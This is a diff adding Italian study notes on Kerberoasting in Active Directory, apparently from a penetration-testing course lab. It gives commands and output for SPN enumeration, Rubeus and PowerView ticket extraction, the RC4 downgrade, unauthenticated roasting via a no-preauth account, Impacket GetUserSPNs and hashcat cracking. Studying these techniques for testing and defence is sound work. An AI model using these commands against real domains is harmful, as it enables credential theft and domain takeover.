@@ -29,6 +29,14 @@
   - [Kerberoasting](#kerberoasting)
     - [Cos'è un SPN?](#cosè-un-spn)
       - [Account di Servizio vs Account Utente](#account-di-servizio-vs-account-utente)
+      - [Dettagli](#dettagli)
+      - [Controllo Manuale](#controllo-manuale)
+      - [Strumenti Automatizzati](#strumenti-automatizzati)
+      - [Cracking dell'hash](#cracking-dellhash-1)
+      - [Kerberoasting senza password dell'account](#kerberoasting-senza-password-dellaccount)
+        - [Perchè è pericolo?](#perchè-è-pericolo)
+        - [AS-REP Roasting vs Kerberoasting senza credenziali](#as-rep-roasting-vs-kerberoasting-senza-credenziali)
+      - [Kerberoasting from Linux](#kerberoasting-from-linux)
     - [Attacchi sulla Kerberos Delegation](#attacchi-sulla-kerberos-delegation)
     - [Attacchi di Ticket Forging](#attacchi-di-ticket-forging)
     - [Ricognizione e Password Spraying](#ricognizione-e-password-spraying)
@@ -348,6 +356,9 @@ VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for objec
 ```GetNPUsers.py``` di Impacket può essere utilizzato per enumerare gli utenti con il loro valore UAC impostato su ```DONT_REQ_PREAUTH```.
 
 > Nota: quando si lavora con Kerberos su Linux, è necessario utilizzare il server DNS del target o configurare la macchina host con le voci DNS corrispondenti per il dominio che si intende attaccare. In altre parole, è necessario disporre di una voce /etc/hosts per il dominio/controller di dominio prima di poterlo attaccare.
+>
+> Per esempio: 10.129.205.35 ACADEMY-KERBATTCK-2-DC01 inlanefreight.local
+
 
 #### Enumerazione degli utenti AS-REPRoastable
 ```
@@ -472,6 +483,451 @@ Il flusso di un attacco è:
 Kerberoasting è particolarmente insidioso perché la fase di richiesta del ticket è completamente legittima e difficile da distinguere dal traffico normale.
 
 
+#### Dettagli
+Quando il KDC risponde a una richiesta TGS, invia il seguente messaggio:
+
+![alt text](images/kerberos/tgs_rep.png)
+
+Questo messaggio è completamente crittografato con la chiave di sessione condivisa tra l'utente e il KDC, quindi l'utente può decifrarlo perché la conosce. Tuttavia, il ticket TGS o Service Ticket (ST) incorporato è crittografato ```con la chiave segreta del service account```. L'utente, quindi, ha un pezzo di dato cifrato con la password del service account.
+
+- Un utente può richiedere tutti i servizi Service Ticket (ST) disponibili presenti nell'ambiente Active Directory e ottenere i relativi ticket cifrati con la chiave segreta di ogni service account.
+- Quando si dispone di una Service Ticket (ST) crittografata con la password di un account di servizio, l'utente può eseguire un attacco di forza bruta offline per tentare di recuperare la password in chiaro.
+- Però, la maggior parte dei servizi viene eseguita da account macchina (COMPUTERNAME$), che hanno password generate casualmente lunghe 120 caratteri, rendendo impraticabile l'attacco di forza bruta.
+- Ma, a volte i servizi sono gestiti da terzi user accounts. Questi sono i servizi che ci interessano. Un account utente ha una password impostata da una persona, che è molto più prevedibile. Questi sono gli account presi di mira dall'attacco Kerberoast. Quando gli account SPN sono configurati per utilizzare l'algoritmo di crittografia RC4, i ticket possono essere molto più facili da decifrare offline. Potremmo imbatterci in organizzazioni che utilizzano solo il vecchio algoritmo di crittografia RC4, crittograficamente insicuro. Al contrario, altre organizzazioni più mature utilizzano solo AES (Advanced Encryption Standard), che può essere molto più difficile da decifrare, anche con un robusto sistema di cracking delle password.
+
+#### Controllo Manuale
+Si cercano gli account utente (non gli account macchina) che espongono un servizio. Un account che espone un servizio ha un Service Principal Name (o SPN). Si tratta di un attributo LDAP impostato sull'account che indica l'elenco dei servizi esistenti forniti da tale account. Se questo attributo non è vuoto, l'account offre almeno un servizio.
+
+Filtro LDAP per cercare gli utenti che espongono un servizio:
+```
+&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
+```
+Questo filtro restituisce un elenco di utenti con un SPN non vuoto. Un piccolo script PowerShell ci permette di automatizzare la ricerca di questi account in un ambiente:
+```
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+$results = $search.Findall()
+foreach($result in $results)
+{
+    $userEntry = $result.GetDirectoryEntry()
+    Write-host "User" 
+    Write-Host "===="
+    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
+        Write-host ""
+    Write-host "SPNs"
+    Write-Host "===="     
+    foreach($SPN in $userEntry.servicePrincipalName)
+    {
+        $SPN       
+    }
+    Write-host ""
+    Write-host ""
+}
+```
+Questo script si connette al Domain Controller e cerca tutti gli oggetti che corrispondono al filtro specificato. Ogni risultato mostra il suo nome (Distinguished Name) e l'elenco degli SPN associati a tale account.
+```
+PS C:\Users\pixis> .\FindSPNAccounts.ps1
+
+Users
+====
+krbtgt ( CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+kadmin/changepw
+
+User
+====
+sqldev ( CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQL_svc_dev/inlanefreight.local:1443
+
+User
+====
+sqlprod ( CN=sqlprod,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQLSvc/sql01:1433
+
+User
+====
+sqlqa ( CN=sqlqa,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQL_svc_qa/inlanefreight.local:1443
+
+User
+====
+sql-test ( CN=sql-test,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
+SPNs
+====
+MSSQL_svc_test/inlanefreight.local:1443
+```
+
+Questo script ci permette di avere un elenco di account Kerberostable, ma non esegue una richiesta TGS e non estrae l'hash che potremmo poi forzare con un attacco a forza bruta.
+
+> Possiamo anche utilizzare il programma binario ```Setspn``` integrato in Windows per cercare gli account SPN.
+
+#### Strumenti Automatizzati
+```PowerView``` può essere utilizzato per enumerare gli utenti con un SPN impostato e richiedere il Service Ticket (ST)automaticamente ed avere l'hash.
+
+**Enumerare gli SPN con PowerView**
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -SPN
+
+logoncount                    : 0
+badpasswordtime               : 12/31/1600 8:00:00 PM
+description                   : Key Distribution Center Service Account
+distinguishedname             : CN=krbtgt,CN=Users,DC=inlanefreight,DC=local
+objectclass                   : {top, person, organizationalPerson, user}
+name                          : krbtgt
+primarygroupid                : 513
+objectsid                     : S-1-5-21-228825152-3134732153-3833540767-502
+samaccountname                : krbtgt
+admincount                    : 1
+codepage                      : 0
+samaccounttype                : USER_OBJECT
+showinadvancedviewonly        : True
+accountexpires                : NEVER
+cn                            : krbtgt
+whenchanged                   : 5/4/2022 8:04:31 PM
+instancetype                  : 4
+objectguid                    : a68bfed4-1ccf-4b62-8efa-63b32841c05d
+lastlogon                     : 12/31/1600 8:00:00 PM
+lastlogoff                    : 12/31/1600 8:00:00 PM
+objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=inlanefreight,DC=local
+dscorepropagationdata         : {5/4/2022 8:04:31 PM, 5/4/2022 7:49:22 PM, 1/1/1601 12:04:16 AM}
+serviceprincipalname          : kadmin/changepw
+memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=inlanefreight,DC=local
+whencreated                   : 5/4/2022 7:49:21 PM
+iscriticalsystemobject        : True
+badpwdcount                   : 0
+useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
+usncreated                    : 12324
+countrycode                   : 0
+pwdlastset                    : 5/4/2022 3:49:21 PM
+msds-supportedencryptiontypes : 0
+usnchanged                    : 12782
+<SNIP>
+```
+
+Ma si può anche utilizzare PowerView per eseguire direttamente l'attacco Kerberoasting:
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Invoke-Kerberoast
+
+SamAccountName       : adam.jones
+DistinguishedName    : CN=Adam Jones,OU=Operations,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : IIS_dev/inlanefreight.local:80
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local:80*$D7C42CD87BEF69BA275C9642BBEA9022BE3C1<SNIP>
+
+SamAccountName       : sqldev
+DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_dev/inlanefreight.local:1443
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1443*$29A78F89AC24EADBB4532DF066B90F1D808A5<SNIP>
+
+SamAccountName       : sqlqa
+DistinguishedName    : CN=sqlqa,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_qa/inlanefreight.local:1443
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local:1443*$895B5A094F49081330D4AEA7C1254F37EEAD7<SNIP>
+
+SamAccountName       : sql-test
+DistinguishedName    : CN=sql-test,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_test/inlanefreight.local:1443
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local:1443*$68F3B21822B3C16D272F38A5658E20F580037<SNIP>
+
+SamAccountName       : sqlprod
+DistinguishedName    : CN=sqlprod,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQLSvc/sql01:1433
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01:1433*$EE29DA2458CA695EC2EDE568E9918909F7A05<SNIP>
+```
+
+Si può anche usare Rubeus per eseguire il Kerberosting su tutti gli utenti disponibili e restituire i loro hash per il cracking offline:
+```
+C:\Tools> C:\Tools>Rubeus.exe kerberoast /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 6
+
+
+[*] SamAccountName         : sqldev
+[*] DistinguishedName      : CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : MSSQL_svc_dev/inlanefreight.local:1433
+[*] PwdLastSet             : 10/14/2022 7:00:06 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$21CF6BFCE5377C1FA957FC340261E6A3$22AC9C6E64F19D4E51E849A99DC4FC4FCE819E376045D1310393C7D26A42FFE50607C42A5F5E038E30867855091726D5E21FC0C6C49730EA32CE8BF95EB6158D30796D016CCF6BA7E5A8825DECFBD9D619917BC9BF7B2A6E53380563DDC5BF24DDEE8B38D5F869DE6682BA2C762520434027485919F8F364F8B9D84B91C3D1EA8EECA64F5C9690276A6211F5CE6C4AEA57ADB06188BE5E538DAC82C3F7EE708188B3E4FD452C06FA41022317E97E9B840B93E4A03E7429D60FC4F8EB7546597B516695BDEB010CA3FEB5A25E36BEC787044DFB19117616D76DAE523248DF55DC2513C05788B27BCE31A3FF38E820F63BB491ECCA2563799C9C4563576B22EEB703E09B68AA95EC50CD234BFDF479027415A58C48D024611E281DDD9355FFBF02BA277B10D6D5D347BFB751FA6101FFE915A<SNIP>
+```
+
+- Si può anche effettuare il Kerberos di un utente specifico e scrivere il risultato in un file utilizzando il flag ```/outfile:filename.txt```. Per esempio: ```.\Rubeus.exe kerberoast /outfile:hashes.txt /user:jacob.kelly```.
+-  SI può utilizzare gli argomenti ```/pwdsetaftere``` e ```/pwdsetbefore``` per gli account Kerberos la cui password è stata impostata entro una data specifica; questo può esserci utile, perchè a volte si trovano account legacy con una password impostata molti anni fa che non rientra nell'attuale policy delle password ed è relativamente facile da decifrare.
+- Si può utilizzare questo ```/statsflag``` per visualizzare le statistiche relative agli account Kerberostable senza inviare alcuna richiesta di ticket. Ciò può essere utile per raccogliere informazioni e verificare i tipi di crittografia utilizzati dai ticket degli account.
+- Il flag ```/tgtdeleg``` può essere utile in situazioni in cui troviamo account con le opzioni ```This account supports Kerberos AES 128-bit encryption``` o ```This account supports Kerberos AES 256-bit encryption```, il che significa che quando eseguiamo un attacco Kerberoast, otterremo un ticket AES-128 (type 17) o TGS AES-256 (type 18) che può essere significativamente più difficile da decifrare rispetto RC4 (type 23). Si capisce la differenza perché un ticket crittografato con RC4 restituirà un hash che inizia con il prefisso ```$krb5tgs$23$*```, mentre i ticket crittografati AES hanno un hash che inizia con ```$krb5tgs$18$*```.
+- Nei casi in cui riceviamo l'hash dell'account con crittografia AES (che è più difficile da decifrare), possiamo utilizzare il flag ```/tgtdeleg``` con Rubeus per forzare la crittografia RC4. Questo potrebbe funzionare in alcuni domini in cui RC4 è integrato come misura di sicurezza per la compatibilità con i servizi più vecchi. In caso di successo, potremmo ottenere un hash della password che potrebbe essere decifrato minuti o addirittura ore più velocemente rispetto a un hash crittografato con AES.
+
+#### Cracking dell'hash
+Rubeus restituisce l'elenco degli hash associati ai diversi ticket TGS o Service Tickets (STs). Tutto ciò che resta da fare è usare hashcat per provare a recuperare la password in chiaro associata a questi account. La modalità hash di Hashcat da utilizzare è 13100 (Kerberos 5, etype 23, TGS-REP).
+
+```
+C:\Tools\hashcat-6.2.6> hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O
+
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 2.1 WINDOWS) - Platform #1 [Intel(R) Corporation]
+====================================================================
+* Device #1: AMD EPYC 7401P 24-Core Processor, 2015/4094 MB (511 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 31
+
+Hashes: 6 digests; 6 unique digests, 6 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Not-Iterated
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: C:\Tools\rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+
+$krb5tgs$23$*jacob.kelly$INLANEFREIGHT.LOCAL$SVC/FILER02.inlanefreight.local@INLANEFREIGHT.LOCAL*$ac3b7a50ae9b3af123888b5722c56665$cdc909a1608c1fe4e14787df6203799f26a<SNIP>
+```
+
+
+#### Kerberoasting senza password dell'account
+Esiste un caso in cui è possibile eseguire un attacco Kerberoasting senza un account di dominio e una password validi (o shell SYSTEM/shell come account con privilegi limitati su un host aggiunto al dominio). Ciò è possibile quando si conosce un account senza pre-autenticazione Kerberos abilitata. È possibile utilizzare questo account per utilizzare una richiesta AS-REQ (solitamente utilizzata per richiedere un TGT) per richiedere un ticket TGS per un utente vulnerabile a Kerberoasting. Questo viene fatto modificando la parte req-body della richiesta.
+
+Per eseguire questo attacco, abbiamo bisogno di:
+- Nome utente di un account con pre-autenticazione disabilitata ( DONT_REQ_PREAUTH).
+- Un SPN di destinazione o un elenco di SPN.
+Per simulare l'assenza di autenticazione, utilizzeremo Rubeus ```createnetonly``` e la sua finestra CMD per eseguire l'attacco.
+
+```
+C:\Tools> Rubeus.exe createnetonly /program:cmd.exe /show
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Create Process (/netonly)
+
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : FQW21FKC
+[*] Domain          : KNVRD2SG
+[*] Password        : IL6X2VCC
+[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 6428
+[+] LUID            : 0x10885a
+```
+Questo apre un cmd.exe con credenziali completamente false e casuali (es. FQW21FKC / IL6X2VCC). Simula la condizione di non avere alcuna autenticazione di dominio valida. Il risultato è una shell "anonima" dal punto di vista del dominio.
+
+Dalla nuova finestra del prompt dei comandi che si aprirà, effettueremo l'attacco; se proviamo a eseguire l'opzione Kerberoast, fallirà perché non siamo autenticati:
+
+```
+C:\Tools> Rubeus.exe kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Kerberoasting
+
+
+[!] Unhandled Rubeus exception:
+
+System.DirectoryServices.ActiveDirectory.ActiveDirectoryOperationException: Current security context is not associated with an Active Directory domain or forest.
+   at System.DirectoryServices.ActiveDirectory.DirectoryContext.GetLoggedOnDomain()
+   at System.DirectoryServices.ActiveDirectory.DirectoryContext.IsContextValid(DirectoryContext context, DirectoryContextType contextType)
+   at System.DirectoryServices.ActiveDirectory.DirectoryContext.isDomain()
+   at System.DirectoryServices.ActiveDirectory.Domain.GetDomain(DirectoryContext context)
+   at Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)
+   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
+```
+
+Ora, se includiamo un utente con ```DONT_REQ_PREAUTH``` tipo ```amber.smith``` e un ```SPN``` come ```MSSQLSvc/SQL01:1433```, verrà restituito un ticket:
+
+```
+C:\Tools> Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Kerberoasting
+
+[*] Using amber.smith without pre-auth to request service tickets
+
+[*] Target SPN             : MSSQLSvc/SQL01:1433
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
+[*] Hash                   : $krb5tgs$23$*MSSQLSvc/SQL01:1433$inlanefreight.local$MSSQLSvc/SQL01:1433*$7E08E831C13A2EEAEA47C13ECD378E8D$D6E591A4AB495AFEE4BD9E893A39C7B9E77C3D7759D9923<SNIP>
+```
+
+Qui Rubeus:
+- Costruisce un AS-REQ modificato usando amber.smith (che non richiede pre-auth)
+- Invece di chiedere un TGT, modifica il corpo della richiesta per ottenere un TGS per MSSQLSvc/SQL01:1433
+- Il KDC risponde con il ticket cifrato con l'hash della password dell'account SQL
+- Rubeus restituisce l'hash in formato crackabile offline (```$krb5tgs$23$*...*```)
+
+> Nota: Invece di /spn possiamo usare /spns:listofspn.txt per provare più SPN.
+
+##### Perchè è pericolo?
+![alt text](images/kerberos/kerberoasting_no_auth.png)
+
+> Si tratta di un attacco non autenticato: basta conoscere il nome di un account con DONT_REQ_PREAUTH (informazione spesso ricavabile anche senza credenziali tramite enumerazione LDAP anonima) per ottenere hash crackabili di altri account di servizio.
+
+##### AS-REP Roasting vs Kerberoasting senza credenziali
+**AS-REP Roasting — l'attacco "diretto"**
+
+Qui si sfrutta DONT_REQ_PREAUTH per attaccare l'account vulnerabile stesso.
+
+![alt text](images/kerberos/DONT_REQ_PREAUTH_as-rep.png)
+
+L'obiettivo è amber.smith. La vulnerabilità è su amber.smith.
+
+**Kerberoasting senza credenziali — l'attacco "indiretto"**
+
+Qui invece usi amber.smith solo come trampolino per attaccare un altro account.
+- Il problema è questo: per fare Kerberoasting classico devi essere autenticato nel dominio. Ma tu non hai credenziali. Quindi come fai?
+- Sfrutti il fatto che amber.smith non richiede pre-autenticazione per fingere di essere lei e fare una richiesta TGS per un account di servizio completamente diverso:
+
+![alt text](images/kerberos/kerberoasting_no_creds.png)
+
+L'obiettivo è l'account SQL. Amber.smith è solo il mezzo per sembrare autenticato.
+
+
+La differenza sta in cosa ottieni e cosa vuoi craccare:
+- AS-REP Roasting → ottieni l'hash di amber.smith → vuoi la password di amber.smith
+- Kerberoasting senza credenziali → ottieni l'hash dell'account SQL → vuoi la password dell'account SQL, e di amber.smith non ti importa nulla
+
+
+#### Kerberoasting from Linux
+Per eseguire l'operazione Kerberoasting da Linux, si può utilizzare ```GetUserSPNs.py``` della suite impacket . Questo strumento è in grado di cercare tutti gli account Kerberostable, estrarre i dati crittografati con la password dell'account di servizio e restituire un hash compatibile con hashcat per ulteriori analisi.
+
+L'esecuzione ```GetUserSPNs.py``` senza parametri produrrà un output simile allo script Powershell ```FindSPNAccounts.ps1```.
+
+```
+Nanan@htb[/htb]$ GetUserSPNs.py inlanefreight.local/pixis
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                     Name        MemberOf                                               PasswordLastSet             LastLogon  Delegation    
+---------------------------------------  ----------  -----------------------------------------------------  --------------------------  ---------  -------------
+MSSQL_svc_dev/inlanefreight.local:1443   sqldev      CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:20.558388  <never>    unconstrained 
+MSSQLSvc/sql01:1433                      sqlprod     CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:27.558399  <never>                  
+MSSQL_svc_qa/inlanefreight.local:1443    sqlqa       CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL    2020-07-27 20:46:33.792787  <never>                  
+MSSQL_svc_test/inlanefreight.local:1443  sql-test                                                           2020-07-27 20:47:07.574105  <never>                  
+IIS_dev/inlanefreight.local:80           adam.jones                                                         2020-07-27 21:35:57.069094  <never>
+```
+
+Siccome si vede che esistono degli account Kerberoastable, si può richiederne un ticket TGS per il Service Ticket (ST) di ognuno di essi e ottenere un hash decifrabile nel formato di hashcat (e di John the Ripper) con l'argomento ```-request```.
+
+```
+Nanan@htb[/htb]$ GetUserSPNs.py inlanefreight.local/pixis -request
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                     Name        MemberOf                                               PasswordLastSet             LastLogon  Delegation    
+---------------------------------------  ----------  -----------------------------------------------------  --------------------------  ---------  -------------
+MSSQL_svc_dev/inlanefreight.local:1443   sqldev      CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:20.558388  <never>    unconstrained 
+MSSQLSvc/sql01:1433                      sqlprod     CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:27.558399  <never>                  
+MSSQL_svc_qa/inlanefreight.local:1443    sqlqa       CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL    2020-07-27 20:46:33.792787  <never>                  
+MSSQL_svc_test/inlanefreight.local:1443  sql-test                                                           2020-07-27 20:47:07.574105  <never>                  
+IIS_dev/inlanefreight.local:80           adam.jones                                                         2020-07-27 21:35:57.069094  <never>                  
+
+
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~1443*$f06349cf7220c21cde1236e53a491a67$c4c2079e9b<SNIP>
+$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2abcff0fc3318fd94f90014$9272d9d177c6147a1b773ba12f95<SNIP>
+$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~1443*$edaecbbcd610e2dd3ef39d6ea2cb3838$b5dbb92fb35b<SNIP>
+$krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e43ca34c03490e7de627135599ab4$832a1d7<SNIP>
+$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local~80*$2b9cfebc5043606bbebb9f140bdf48cb$c05bf3d19a3e26<SNIP>
+```
+
+**Cracking**
+
+Dopo che ```GetUserSPNs.py``` ha restituito l'elenco degli hash associati ai diversi Service Tickets (STs), si usa hashcat per provare a recuperare la password in chiaro associata a questi account utilizzando hash-mode ```13100 (Kerberos 5, etype 23, TGS-REP)```.
+
+```
+Nanan@htb[/htb]$ hashcat -m 13100 hashes.txt rockyou.txt
+
+hashcat (v5.1.0) starting...
+<SNIP>
+$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~1443*$edaecbbcd<SNIP>ec0ef:Welcome1
+$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2abcff0fc3318fd9<SNIP>7170c:Welcome1
+$krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e<SNIP>9f08c:Welcome1
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~1443*$f06349c<SNIP>173ca:Welcome1
+<SNIP>
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: Kerberos 5 TGS-REP etype 23
+Hash.Target......: hashes.txt
+Time.Started.....: Wed Aug 12 15:24:44 2020 (20 secs)
+Time.Estimated...: Wed Aug 12 15:25:04 2020 (0 secs)
+Guess.Base.......: File (Tools/Cracking/Wordlists/Passwords/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   707.8 kH/s (11.43ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 4/5 (80.00%) Digests, 4/5 (80.00%) Salts
+Progress.........: 71721925/71721925 (100.00%)
+Rejected.........: 0/71721925 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:4 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: $HEX[2321686f74746965] -> $HEX[042a0337c2a156616d6f732103]
+```
 
 
 ### Attacchi sulla Kerberos Delegation
